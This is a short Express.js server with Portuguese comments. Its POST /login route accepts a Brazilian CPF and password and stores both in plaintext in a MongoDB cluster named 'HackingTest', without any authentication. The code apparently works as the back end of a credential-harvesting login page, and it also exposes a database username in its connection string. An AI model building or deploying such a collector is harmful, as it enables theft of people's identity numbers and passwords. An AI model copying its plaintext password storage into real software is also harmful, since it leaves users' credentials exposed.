const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;

// Conexão com MongoDB
mongoose.connect('mongodb+srv://dansaraiva23:<db_password>@hackingtest.pf4jqlh.mongodb.net/?retryWrites=true&w=majority&appName=HackingTest')
  .then(() => console.log('✅ MongoDB conectado com sucesso!'))
  .catch(err => console.error('❌ Erro ao conectar no MongoDB:', err));

// Modelo de login
const loginSchema = new mongoose.Schema({
  cpf: { type: String, required: true },
  senha: { type: String, required: true },
  data: { type: Date, default: Date.now }
});

const Login = mongoose.model('Login', loginSchema);

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Rota para receber os dados do login
app.post('/login', async (req, res) => {
  try {
    const { cpf, senha } = req.body;

    if (!cpf || !senha) {
      return res.status(400).json({ message: 'CPF e senha são obrigatórios.' });
    }

    const novoLogin = new Login({ cpf, senha });
    await novoLogin.save();

    console.log('✅ Login salvo com sucesso:', novoLogin);
    res.json({ message: 'Login salvo com sucesso!' });
  } catch (error) {
    console.error('❌ Erro ao salvar login:', error);
    res.status(500).json({ message: 'Erro interno do servidor.' });
  }
});

// Rota de teste (opcional)
app.get('/teste', async (req, res) => {
  try {
    const testeLogin = new Login({ cpf: '12345678900', senha: 'teste123' });
    await testeLogin.save();
    res.send('🧪 Teste de login salvo com sucesso.');
  } catch (err) {
    console.error(err);
    res.status(500).send('Erro ao salvar teste.');
  }
});

// Inicia o servidor
app.listen(PORT, () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
});
